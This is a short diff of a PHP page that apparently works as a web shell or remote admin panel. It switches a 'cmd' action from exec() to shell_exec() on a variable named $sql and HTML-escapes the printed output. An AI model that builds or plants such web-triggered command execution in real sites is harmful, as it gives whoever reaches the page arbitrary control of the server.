@@ -27,8 +27,7 @@
                 header("Location: remote.php");
                 break;
             case "cmd":
-                exec($sql,$outputExec);
-                $result = $outputExec[0];
+                $outputExec = shell_exec($sql);
                 break;
             case "r":
                 exec("");
@@ -58,7 +57,7 @@
         <?php
             if($action=="cmd"){
                 echo "<pre>";
-                print_r($outputExec);
+                echo htmlspecialchars($outputExec);
                 echo "</pre>";
             }
             else if($action=="sql"){
